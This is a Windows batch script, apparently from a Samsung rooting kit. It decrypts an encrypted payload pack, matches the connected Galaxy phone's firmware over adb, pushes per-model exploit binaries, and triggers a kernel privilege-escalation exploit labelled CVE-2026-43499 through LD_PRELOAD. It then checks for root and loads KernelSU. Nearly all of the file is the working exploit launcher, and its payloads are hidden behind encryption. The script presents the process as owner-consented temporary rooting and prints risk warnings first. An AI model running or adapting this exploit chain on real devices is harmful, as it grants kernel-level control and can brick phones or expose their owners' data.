@echo off
rem ===========================================================================
rem  Samsung-root-kit  multi-model one-click root (run_root.cmd)
rem  supports ALL models in payloads/  (S23/S24/S25/Z Fold5/Fold6/W26 ...)
rem  memory root + KernelSU, reboot to clear, rerun to re-root
rem  NOTE: this file must stay GBK/ANSI encoded + CRLF line endings.
rem ===========================================================================

setlocal enabledelayedexpansion

rem ---------- config ----------
set "SCRIPT_DIR=%~dp0"
set "PAYLOAD_DIR=%SCRIPT_DIR%payloads"
set "PACK=%SCRIPT_DIR%payloads.pack"
set "KSUD="
set "KSUD5=%SCRIPT_DIR%tools\ksud-samsung-android13-5.15-kdp"
set "KSUD61=%SCRIPT_DIR%tools\ksud-samsung-android14-6.1-kdp"
set "KSUD66=%SCRIPT_DIR%tools\ksud-samsung-android15-6.6-kdp"
set "KSUD6X=%SCRIPT_DIR%tools\ksud-samsung-android15-6.6-kdp-x730"
set "KSUD612=%SCRIPT_DIR%tools\ksud-samsung-android16-6.12-kdp"
set "APK=%SCRIPT_DIR%tools\KernelSU_Manager_v3.2.5_32525.apk"
set "CRYPT_PS=%SCRIPT_DIR%tools\payloads_crypt.ps1"

set "DEV_PAYLOAD=/data/local/tmp/cve-2026-43499"
set "DEV_ROOT=/data/local/tmp/cve-2026-43499-root"
set "DEV_KSUD=/data/local/tmp/ksud-selected"

set "ATTEMPTS=1"
set "DO_PUSH=1"
set "DO_APP=1"
set "MODE=full"
set "WARMUP=400"
set "MODEL="
set "WORK_DIR="

rem ---------- arg parse ----------
:parse_args
if "%~1"=="" goto args_done
if /i "%~1"=="--verify" set "MODE=verify" & shift & goto parse_args
if /i "%~1"=="--skip-push" set "DO_PUSH=0" & shift & goto parse_args
if /i "%~1"=="--no-app" set "DO_APP=0" & shift & goto parse_args
if /i "%~1"=="-n" set "ATTEMPTS=%~2" & shift & shift & goto parse_args
if /i "%~1"=="-h" goto usage
if /i "%~1"=="/?" goto usage
echo [ERR] unknown arg: %~1
goto :exit
:usage
echo usage: run_root.cmd [--verify] [--skip-push] [--no-app] [-n N]
goto :exit
:args_done

rem ==================== 安全提示 ====================
echo.
echo ================================================================
echo        即将申请 临时 ROOT 权限
echo ================================================================
echo.
echo  ROOT 属于系统最高控制权限，获取该权限可能会带来以下风险：
echo.
echo  [系统稳定性] 部分系统功能可能异常、卡顿或导致设备重启，
echo               甚至成砖。
echo  [数据安全]   请勿向不可信的应用授予 ROOT 权限，
echo               以防个人隐私泄露或数据丢失。
echo  [安全防护]   部分对安全要求较高的应用（如银行、支付、游戏等）
echo               可能会限制运行。
powershell -NoProfile -Command "Write-Host ' [特别提醒]   root后不能刷入更改分区的模块，不能改刷面具' -ForegroundColor Red"
powershell -NoProfile -Command "Write-Host '               会砖，会砖，会砖！！！！' -ForegroundColor Red"

echo.
echo  本工具获取的权限仅为 临时生效，重启设备后系统将自动恢复默认安全状态。
echo  本应用不会收集或篡改您的个人隐私数据。
echo.
echo  请确认您已了解上述风险，并自愿承担相关操作后果。
set /p "ans=  确认无误请输入 yes 继续: "
if /i not "!ans!"=="yes" (
  echo.
  echo  [ABORT] 未确认，已退出。
  goto :exit
)
echo  [OK] 已确认，继续。

rem ---------- 兜底清理：上次异常退出（强杀/关窗）残留的临时解密目录 ----------
powershell -NoProfile -Command "Get-ChildItem $env:TEMP -Directory -Filter 's9180_root_payload_*' -ErrorAction SilentlyContinue | Where-Object { $_.LastWriteTime -lt (Get-Date).AddHours(-1) } | Remove-Item -Recurse -Force -ErrorAction SilentlyContinue" >nul 2>&1

rem ---------- 准备 payload 源（优先解密 payloads.pack） ----------
if exist "%PACK%" (
  set "WORK_DIR=%TEMP%\s9180_root_payload_%RANDOM%"
  powershell -NoProfile -ExecutionPolicy Bypass -File "%CRYPT_PS%" -Action Unpack -PackFile "%PACK%" -OutDir "!WORK_DIR!" >nul 2>&1
  if errorlevel 1 (
    echo  [ERR] 解密 payloads.pack 失败
    goto :exit
  )
  set "PAYLOAD_DIR=!WORK_DIR!"
) else (
  set "PAYLOAD_DIR=%SCRIPT_DIR%payloads"
)

rem ---------- find adb ----------
set "ADB="
if defined ADB_BIN (
  if exist "%ADB_BIN%" set "ADB=%ADB_BIN%"
)
if not defined ADB (
  where adb >nul 2>&1 && set "ADB=adb"
)
if not defined ADB (
  for %%p in ("%SCRIPT_DIR%adb-bin\adb.exe" "%LOCALAPPDATA%\Android\Sdk\platform-tools\adb.exe" "C:\platform-tools\adb.exe" "D:\platform-tools\adb.exe") do (
    if exist "%%~p" set "ADB=%%~p"
  )
)
if not defined ADB (
  echo [ERR] adb not found. Set ADB_BIN=C:\path\adb.exe or install platform-tools.
  goto :exit
)
set "ADB=%ADB:/=\%"
echo  [OK] 准备就绪。

rem ---------- 模式选择 ----------
echo.
echo  ================================================================
echo   [1] 自动读取手机型号及版本并匹配（需连接手机并开启 USB 调试）
echo   [2] 手动选择机型
echo  ================================================================
set /p "choice=  请选择 (1/2): "
if "!choice!"=="1" goto mode_auto
if "!choice!"=="2" goto mode_manual
echo  [ERR] 无效选项，请重新运行。
goto :exit

rem ---------------- 自动匹配 ----------------
:mode_auto
echo  [*] 读取设备固件信息...
call "%ADB%" get-state >nul 2>&1
if errorlevel 1 (
  echo  [ERR] adb cannot reach device. Enable USB debugging and authorize.
  goto :exit
)
call "%ADB%" get-state 2>nul | findstr /i "device" >nul
if errorlevel 1 (
  echo  [ERR] device state is not "device".
  goto :exit
)
rem 只读取 fingerprint（已包含 board 与 firmware，唯一对应一个 payload）
for /f "delims=" %%i in ('"%ADB%" shell getprop ro.build.fingerprint 2^>nul') do set "FP=%%i"
if not defined FP (
  echo  [ERR] cannot read ro.build.fingerprint from device.
  goto :exit
)
set "MATCH="
set "MATCH_BOARD="
set "MATCH_FW="
for %%f in ("%PAYLOAD_DIR%\*__payload") do (
  set "KEY=%%~nf"
  set "KEY=!KEY:__payload=!"
  for /f "tokens=1,* delims=-" %%a in ("!KEY!") do (
    rem fp 中的 board 字段（如 dm3qzcx）不一定与文件名 board 字段（如 dm3q）一致，
    rem 但 firmware 字符串（如 S9180ZCS8FZE3）在 fp 和文件名中都唯一存在，优先用它匹配。
    set "FW=%%b"
    if not defined FW (
      rem 容错：KEY 不含连字符则跳过
      rem
    ) else (
      echo !FP! | findstr /i /c:"!FW!" >nul
      if not errorlevel 1 (
        if not defined MATCH (
          set "MATCH=!KEY!"
          set "MATCH_BOARD=%%a"
          set "MATCH_FW=%%b"
        )
      )
    )
  )
)
if not defined MATCH (
  echo  [WARN] 未能自动匹配到对应机型 payload，已切换为手动选择：
  goto mode_manual
)
echo  [OK] 已识别设备：[!MATCH!] ^(board=!MATCH_BOARD! fw=!MATCH_FW!^)
call :show_name "!MATCH!"
set /p "c2=  确认无误请输入 yes 开始自动操作: "
if /i not "!c2!"=="yes" ( echo  [ABORT] 已取消 & goto :exit )
set "MODEL=!MATCH!"
goto run_flow

rem ---------------- 手动选择 ----------------
:mode_manual
echo  [*] 支持的机型列表：
set /a IDX=0
for %%f in ("%PAYLOAD_DIR%\*__payload") do (
  set /a IDX+=1
  set "KEY=%%~nf"
  set "KEY=!KEY:__payload=!"
  set "M!IDX!=!KEY!"
  call :list_name "!KEY!" !IDX!
)
echo.
set /p "sel=  请输入机型编号: "
set "MODEL=!M%sel%!"
if not defined MODEL ( echo  [ERR] 无效编号 & goto :exit )
call :show_name "!MODEL!"
set /p "c2=  确认无误请输入 yes 开始自动操作: "
if /i not "!c2!"=="yes" ( echo  [ABORT] 已取消 & goto :exit )

rem ==================== 主流程 ====================
:run_flow
set "PAYLOAD=%PAYLOAD_DIR%\%MODEL%__payload"
set "ROOT_HELPER=%PAYLOAD_DIR%\%MODEL%__root"
if not exist "%PAYLOAD%" ( echo  [ERR] missing payload: %PAYLOAD% & goto :exit )
if not exist "%ROOT_HELPER%" ( echo  [ERR] missing root helper: %ROOT_HELPER% & goto :exit )
echo  [OK] 机型: !MODEL!
echo  [OK] payload: %PAYLOAD%

rem ---------- device check ----------
call "%ADB%" get-state >nul 2>&1
if errorlevel 1 (
  echo [ERR] adb cannot reach device. Enable USB debugging and authorize.
  goto :exit
)
call "%ADB%" get-state 2>nul | findstr /i "device" >nul
if errorlevel 1 (
  echo [ERR] device state is not "device".
  goto :exit
)
echo [OK] device connected

rem ---------- KMI detect & ksud select (must run before KSUD check) ----------
for /f "delims=" %%i in ('"%ADB%" shell uname -r 2^>nul') do set "KV=%%i"
for /f "delims=" %%i in ('"%ADB%" shell getprop ro.product.board 2^>nul') do set "BDEV=%%i"
rem extract major.minor from kernel version
for /f "tokens=1,2 delims=." %%a in ("!KV!") do set "KMAJ=%%a" & set "KMIN=%%b"
set "KSUD="
if "!KMAJ!"=="5" set "KSUD=!KSUD5!" & echo  [OK] KMI=5.x -^> android13-5.15
if "!KMAJ!"=="6" if "!KMIN!"=="1" set "KSUD=!KSUD61!" & echo  [OK] KMI=6.1 -^> android14-6.1
if "!KMAJ!"=="6" if "!KMIN!"=="12" set "KSUD=!KSUD612!" & echo  [OK] KMI=6.12 -^> android16-6.12
if "!KMAJ!"=="6" if "!KMIN!"=="6" if /i "!BDEV!"=="gts11wifi" set "KSUD=!KSUD6X!" & echo  [OK] KMI=6.6 (x730) -^> android15-6.6-x730
if "!KMAJ!"=="6" if "!KMIN!"=="6" if /i not "!BDEV!"=="gts11wifi" set "KSUD=!KSUD66!" & echo  [OK] KMI=6.6 -^> android15-6.6
if not defined KSUD set "KSUD=!KSUD5!" & echo  [WARN] unknown KMI (!KV!), fallback 5.15 ksud
if not exist "!KSUD!" ( echo  [ERR] missing ksud: !KSUD! & goto :exit )


rem ---------- firmware check ----------
for /f "delims=" %%i in ('"%ADB%" shell getprop ro.build.fingerprint 2^>nul') do set "FP=%%i"
for /f "tokens=1,* delims=-" %%a in ("%MODEL%") do set "FW=%%b"
echo fingerprint: !FP!
echo !FP! | findstr /i "!FW!" >nul
if errorlevel 1 (
  echo [WARN] firmware mismatch - expected !FW!
  set /p ans="force continue? (type YES): "
  if /i not "!ans!"=="YES" goto :exit
)

if /i "%MODE%"=="verify" goto verify_mode

rem ---------- push ----------
if "%DO_PUSH%"=="1" (
  echo [*] pushing files...
  call "%ADB%" push "%PAYLOAD%" "%DEV_PAYLOAD%" || ( echo [ERR] push payload failed & goto :exit )
  call "%ADB%" push "%ROOT_HELPER%" "%DEV_ROOT%" || ( echo [ERR] push root failed & goto :exit )
  call "%ADB%" push "%KSUD%" "%DEV_KSUD%" || ( echo [ERR] push ksud failed & goto :exit )
  call "%ADB%" shell "chmod 755 %DEV_PAYLOAD% %DEV_ROOT% %DEV_KSUD%"
  echo [OK] files pushed
) else (
  echo [WARN] skip push
)

rem ---------- warmup ----------
echo [*] warmup %WARMUP%x /system/bin/true
call "%ADB%" shell "i=0; while [ $i -lt %WARMUP% ]; do /system/bin/true; i=$((i+1)); done"

rem ---------- exploit ----------
echo [*] triggering exploit, attempts=%ATTEMPTS% (device may reboot - normal)
set "ROOT_OK=0"

for /l %%a in (1,1,3) do (
  echo [*] exploit attempt %%a/3
  call "%ADB%" wait-for-device >nul 2>&1
  ping -n 3 127.0.0.1 >nul 2>&1
  call "%ADB%" shell "CVE43499_ROOT_HELPER=%DEV_ROOT% EXPLOIT_ATTEMPTS=%ATTEMPTS% LD_PRELOAD=%DEV_PAYLOAD% /system/bin/true"
  if "!ROOT_OK!"=="1" goto root_done

  rem verify via helper
  call "%ADB%" exec-out "%DEV_ROOT%" -c /system/bin/id 2>nul | findstr /i "uid=0(root)" >nul && set "ROOT_OK=1"
  if "!ROOT_OK!"=="1" goto root_done
)

:root_done
if not "%ROOT_OK%"=="1" (
  echo [ERR] exploit did not obtain root.
  echo   * reboot device and rerun
  echo   * if "verification failed E101" appears, payload/root not patched
  goto :exit
)
echo [OK] root obtained
call "%ADB%" exec-out "%DEV_ROOT%" -c /system/bin/id

rem ---------- KernelSU ----------
echo [*] installing KernelSU (late-load)
call "%ADB%" shell "%DEV_ROOT%" --late-load
ping -n 3 127.0.0.1 >nul 2>&1
call "%ADB%" shell "cat /proc/modules" | findstr /i "kernelsu" >nul
if not errorlevel 1 (
  echo [OK] kernelsu loaded
  call "%ADB%" shell "cat /proc/modules" | findstr /i kernelsu
) else (
  echo [ERR] kernelsu not in /proc/modules
  echo retry: %ADB% shell %DEV_ROOT% --late-load
)

rem ---------- KernelSU Manager app ----------
if "%DO_APP%"=="1" (
  echo [*] installing KernelSU Manager app...
  call "%ADB%" install -r "%APK%" && (
    echo [OK] KernelSU Manager installed
    call "%ADB%" shell am start -n me.weishu.kernelsu/.ui.MainActivity >nul 2>&1
  ) || echo [WARN] app install failed - install manually
)

echo.
echo ============================================================
echo  done. Memory root - reboot to clear, rerun to re-root.
echo  If "operation failed": reboot device first, then rerun.
echo ============================================================
goto :exit

:verify_mode
echo [*] verify mode
call "%ADB%" shell "ls -l %DEV_PAYLOAD% %DEV_ROOT% %DEV_KSUD%"
call "%ADB%" shell "cat /proc/modules" | findstr /i "kernelsu" >nul
if not errorlevel 1 ( echo [OK] kernelsu loaded - device currently rooted ) else ( echo [WARN] kernelsu not loaded )
echo [OK] verify done
goto :exit

rem ==================== 子程序：显示机型名 ====================
:show_name
set "K=%~1"
for /f "tokens=1,* delims=-" %%a in ("%K%") do set "B=%%a" & set "F=%%b"
set "N=%K%"
if /i "%B%"=="dm1q" set "N=Galaxy S23 (SM-S9110)"
if /i "%B%"=="dm2q" set "N=Galaxy S23+ (SM-S9160)"
if /i "%B%"=="dm3q" set "N=Galaxy S23 Ultra (SM-S9180)"
if /i "%B%"=="e1q" set "N=Galaxy S24 (SM-S9210)"
if /i "%B%"=="e2q" set "N=Galaxy S24+ (SM-S9260)"
if /i "%B%"=="e3q" set "N=Galaxy S24 Ultra (SM-S9280)"
if /i "%B%"=="pa1q" set "N=Galaxy S25 (SM-S9310)"
if /i "%B%"=="pa2q" set "N=Galaxy S25+ (SM-S9360)"
if /i "%B%"=="pa3q" set "N=Galaxy S25 Ultra (SM-S9380)"
if /i "%B%"=="psq" set "N=Galaxy S25 FE (SM-S9370)"
if /i "%B%"=="q5q" set "N=Galaxy Z Fold5 (SM-F9460)"
if /i "%B%"=="q7q" set "N=Galaxy Z Fold6 (SM-F9660)"
if /i "%B%"=="w9026" set "N=Galaxy W26 (SM-W9026)"
echo   [*] 已选择机型: %K%  [%N%]  固件: %F%
exit /b

:list_name
set "K=%~1"
for /f "tokens=1,* delims=-" %%a in ("%K%") do set "B=%%a" & set "F=%%b"
set "N=%K%"
if /i "%B%"=="dm1q" set "N=Galaxy S23 (SM-S9110)"
if /i "%B%"=="dm2q" set "N=Galaxy S23+ (SM-S9160)"
if /i "%B%"=="dm3q" set "N=Galaxy S23 Ultra (SM-S9180)"
if /i "%B%"=="e1q" set "N=Galaxy S24 (SM-S9210)"
if /i "%B%"=="e2q" set "N=Galaxy S24+ (SM-S9260)"
if /i "%B%"=="e3q" set "N=Galaxy S24 Ultra (SM-S9280)"
if /i "%B%"=="pa1q" set "N=Galaxy S25 (SM-S9310)"
if /i "%B%"=="pa2q" set "N=Galaxy S25+ (SM-S9360)"
if /i "%B%"=="pa3q" set "N=Galaxy S25 Ultra (SM-S9380)"
if /i "%B%"=="psq" set "N=Galaxy S25 FE (SM-S9370)"
if /i "%B%"=="q5q" set "N=Galaxy Z Fold5 (SM-F9460)"
if /i "%B%"=="q7q" set "N=Galaxy Z Fold6 (SM-F9660)"
if /i "%B%"=="w9026" set "N=Galaxy W26 (SM-W9026)"
echo   [%~2] %K%  [%N%]  固件: %F%
exit /b

:exit
rem 清理临时解密目录
if defined WORK_DIR (
  if exist "%WORK_DIR%" rd /s /q "%WORK_DIR%" >nul 2>&1
)
echo.
echo press any key to close...
pause >nul




